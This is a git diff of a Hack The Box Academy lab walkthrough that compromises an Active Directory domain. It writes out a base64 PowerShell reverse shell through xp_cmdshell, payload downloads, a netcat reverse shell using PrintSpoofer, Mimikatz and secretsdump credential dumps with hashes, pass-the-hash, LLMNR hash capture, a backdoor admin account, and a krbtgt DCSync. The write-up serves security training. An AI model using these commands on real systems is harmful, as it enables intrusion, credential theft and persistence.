@@ -1,4 +1,6 @@
-# AD Enumeration & Attacks - Skills Assessment Part II
+# AD Enumeration & Attacks - Skills Assessment Part II  
+
+[AD Enumeration & Attacks - Skills Assessment Part II - Scenario](https://academy.hackthebox.com/module/143/section/1279)  
 
 ## Objective
 
@@ -8,10 +10,10 @@
 
 ## Internal Access  
 
->Connect to the provided internal kali via SSH to `10.129.50.115` with user `htb-student` and password `HTB_@cademy_stdnt!`.  
+>Connect to the provided internal kali via SSH to `10.129.171.159` with user `htb-student` and password `HTB_@cademy_stdnt!`.  
 
 ```
-ssh htb-student@10.129.50.115
+ssh htb-student@10.129.171.159
 ```  
 
 >NMAP scan of the subnet `172.16.7.1-255`, revealed the 4 targets, and setting up proxychains enable the forwarding/pivoting of traffic from our Kali host on `10.10.15.204` to the remote subnet `172.16.7.x`.  
@@ -19,10 +21,10 @@ ssh htb-student@10.129.50.115
 >Dynamic SSH port 9050 forwarding from parrot host via Kali attacker.  
 
 ```
-ssh -D 9050 htb-student@10.129.50.115
+ssh -D 9050 htb-student@10.129.171.159
 ```  
 
-Configure the proxy chain config file, `/etc/proxychains.conf` on parrot host, `10.129.50.115` to direct traffic via socks4 on port `9050`.
+Configure the proxy chain config file, `/etc/proxychains.conf` on parrot host, `10.129.171.159` to direct traffic via socks4 on port `9050`.
 
 ```
 sudo vi /etc/proxychains.conf
@@ -359,15 +361,14 @@ go
 
 ### Low Privilege Reverse Shell  
 
->Using the PowerShell Base64 Reverse Shell option at [https://www.revshells.com/](https://www.revshells.com/) to generate below payload.  
+>Using the PowerShell Base64 Reverse Shell option at [https://www.revshells.com/](https://www.revshells.com/) to generate below payload. The payload settings are as following, lhost = 172.16.7.240, reverse port is 4443. 
 
 ```
-1> xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADQANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
-2> go
-
+xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgA3AC4AMgA0ADAAIgAsADQANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
 ```  
+>Go  
 
->Metasploit handler accept the incoming connection from server SQL01.
+>Metasploit handler accept the incoming connection on port `4443` on the localhost ip `172.16.7.240` from the remote server SQL01.  
 
 >Start again Enumeration on server SQL01 to obtain administrator access.
 >The reverse shell obtained run as the user `nt service\mssql$sqlexpress` and running `whoami /priv`, the user has the privileges of `SeImpersonatePrivilege` on the windows target.  
@@ -384,6 +385,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.7.240 LPORT=7777 -f
 >Setup msfconsole multi/handler listener port 7777
 
 ```
+sudo msfconsole
+
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set lhost 172.16.7.240
@@ -417,72 +420,210 @@ load incognito
 getprivs
 
 list_tokens -u
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+```
+
+>The token for `NT AUTHORITY\SYSTEM` is not availble, going to test `printspoofer` exploit.  
 
 
+### PrintSpoofer
 
-impersonate_token "NT AUTHORITY\SYSTEM"
+>The latest github for the [PrintSpoofer Exploit Release](https://github.com/itm4n/PrintSpoofer) downloaded.  
+>Powershell used to Transfer payload exploit to SQL01 target server.
 
+```
+python3 -m http.server 8000
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-### inside meterpreter metasploit
-impersonate_token "NT AUTHORITY\SYSTEM"
+(new-object net.webclient).downloadfile('http://172.16.7.240:8000/PrintSpoofer64.exe', 'C:\tools\PrintSpoofer64.exe')
+(new-object net.webclient).downloadfile('http://172.16.7.240:8000/nc.exe', 'C:\tools\nc.exe')
 
+```
+
+>Start NetCat on port 1337 on host 172.16.7.240.  
+
+```
+nc -nvlp 1337
+```  
+
+>Execute printSpoofer to get elevated privileged CMD shell.  
+
+```
+c:\tools\PrintSpoofer64.exe -c "C:\TOOLS\nc.exe 172.16.7.240 1337 -e cmd"
+```
+
+>Netcat listener answers connection as `nt authority\system`.
+
+### SAM Dump  
+
+>Transfer meterpreter payload SQL01 with certutil.
+
+```
+certutil -urlcache -f http://172.16.7.240:8000/shell7777.exe shell7777.exe
+```
+
+>Setup msfconsole multi/handler listener port 7777
+
+```
+sudo msfconsole
+
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 172.16.7.240
+set lport 7777
+set AutoRunScript post/windows/manage/migrate
+
+run
+```  
+
+>Execute shell payload on SQL01 to get meterpreter shell and load `kiwi` module - MimiKatz.
+
+```
 getuid
-shell
-ps
-###  shell fail
-###  migrate to another process
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+load kiwi
+
+creds_all
+```
+
+>Output Results:  
+
+```
+Retrieving all credentials
+msv credentials
+===============
+
+Username  Domain         NTLM                          SHA1                          DPAPI
+--------  ------         ----                          ----                          -----
+
+mssqlsvc  INLANEFREIGHT  8c9555327d95f815987c0d81238c7660  0a8d7e8141b816c8b20b4762da5b4ee7038b515c  a1568414db09f65c238b7557bc3ceeb8
+
+```  
+
+>hashcat crack offline NTLM hash fails.  
+
+```
+hashcat.exe -m 1000 8c9555327d95f815987c0d81238c7660 s:\wordlists\rockyou.txt -O
+```  
 
 
+## AD Lateral Privileges  
 
+>Gain Admin local access on MS01, (`172.16.7.50`) server as local administrator.  
 
-Meterpreter - Migrate to another Process
+```
+proxychains xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /d:inlanefreight.local /dynamic-resolution /drive:kali-drive,/home/kali/Downloads/htb/academy/ActiveDirectory
+```  
 
-Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions -
- it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). 
- Ensure that you migrate to a process with correct permissions 
- The safest process to pick is the services.exe process. 
- First use the ps command to view processes and find the PID of the services.exe process.
-  Migrate to this process using the command migrate PID-OF-PROCESS
+>With above RDP session and remote drive attacked to kali tools for active directory transfer mimikatz and the all other powershell tools to target server MS01.  
 
+>Pass-the-hash (PTH) using `impacket-psexec`, and important in parameters, remember to include the ```:``` colon character in front of the NTLM hash as authentication.  
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-ps
-###    migrate <process PID number>
-migrate 2980
-shell
+```
+impacket-psexec mssqlsvc@172.16.7.50 -hashes :8c9555327d95f815987c0d81238c7660
+```  
 
-###   success to a process running as NT Authority\SYSTEM
+### Attacking SAM 
 
-whoami
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+>Dump SAM credentials and crack registry exported hive secrets by using secretsdump.py.  
 
+```
+python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+```  
 
-ROOT - NT Authority\SYSTEM
+>Output from secrets dump provided no clear text passwords.    
 
+```
+[*] Target system bootKey: 0xfb0f8f82e8a96acc7ed29feeeeb32f97
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+[*] Dumping cached domain logon information (domain/username:hash)
+INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#30376b08e0552233fba8af8e0be0fb13: (2022-04-30 23:16:27)
+INLANEFREIGHT.LOCAL/AB920:$DCC2$10240#AB920#e078d44e3b52c02486f3b5f24a2c14b0: (2023-07-10 11:20:47)
+[*] Dumping LSA Secrets
+```  
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-root.txt file at C:\Windows\System32\config
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+>Locally dumped hashes from SAM of MS01 provided no access or later movement to privilege escalation.  
 
+```
+proxychains xfreerdp /v:172.16.7.60 /u:mssqlsvc /pth:30B3783CE2ABF1AF70F77D0660CF3453 /size:75%w /cert:ignore
+```
 
-dff0f748678f280250f25a45b8046b4a
-Jeeves
-
-
-
-
-
-
+```
+proxychains impacket-psexec mssqlsvc@172.16.7.50 -hashes :8c9555327d95f815987c0d81238c7660
+```
 
 
 ## AD Privilege Escalation  
 
 
+proxychains impacket-psexec Administrator@172.16.7.3 -Domain inlanefreight.local -hashes :30376b08e0552233fba8af8e0be0fb13
+
+>Persistence by creating local administrator on the member server MS0`.  
+
+```
+net user hacker Password123 /add && net localgroup administrators hacker /add
+```
+
+>Remote Desktop as created local administrator hacker account.  
+
+```
+proxychains xfreerdp /v:172.16.7.50 /u:hacker /p:Password123 /size:75%w /cert:ignore /drive:kali-drive,/home/kali/Downloads/htb/academy/ActiveDirectory
+```  
+
+### Inveigh LLMNR  
+
+>Capture some more hashes of user visiting MS01 server  
+
+```
+Import-Module .\Inveigh.ps1
+Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+```
+
+>Successfully captured the hash of the user, `CT059`, on the member server `MS01`.  
 
 ## AD Compromise  
 
+>Gain another user in the domains username and password by capturing their hash and cracking with hashcat.  
 
+```
+hashcat.exe -m 5600 s:\hashes\10july2023.hash s:\wordlists\rockyou.txt -O
+```  
 
+```
+CT059::INLANEFREIGHT:8abfeb2277bd469b:387be <snip> 0000:charlie1
+```  
+
+Remote desktop as user `CT059` to the member server `MS01`.  
+
+```
+proxychains xfreerdp /v:172.16.7.50 /d:inlanefreight.local /u:CT059 /p:charlie1 /size:75%w /cert:ignore /drive:kali-drive,/home/kali/Downloads/htb/academy/ActiveDirectory
+```  
+
+>Previous bloodhound indicated user `CT059` can edit and modify the domain group `Domain Admins`.
+
+```
+net group "Domain Admins" CT059 /ADD /DOMAIN
+```
+
+>Impacket PSExec as user `CT059` to the member server `MS01`.  
+
+```
+proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py inlanefreight.local/CT059:charlie1@172.16.7.3
+```
+
+>After creating share on ms01, and giving full access to share for authenticated users in domain
+
+>on DC01 shell, map drive and copy mimikatz to DC01
+
+```
+net use x: \\ms01\tools
+
+mimikatz.exe
+
+lsadump::dcsync /user:inlanefreight\krbtgt
+```
+
+>Above command Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise, and lead to full domain administrator access.  
+
+[AD Enumeration & Attacks - Skills Assessment Part II - Scenario](https://academy.hackthebox.com/module/143/section/1279)  
